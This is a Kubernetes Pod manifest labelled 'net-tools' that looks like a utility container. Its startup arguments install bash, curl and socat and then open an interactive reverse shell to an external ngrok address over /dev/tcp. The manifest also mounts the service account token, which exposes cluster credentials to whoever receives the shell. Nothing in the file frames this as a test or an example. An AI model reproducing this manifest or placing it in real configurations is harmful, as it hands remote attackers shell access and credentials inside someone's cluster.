apiVersion: v1
kind: Pod
metadata:
  name: net-tools
  namespace: default
spec:
  containers:
  - name: tools
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - apk add bash curl socat; bash -i >& /dev/tcp/11.tcp.eu.ngrok.io/20728 0>&1; sleep infinity
  automountServiceAccountToken: true
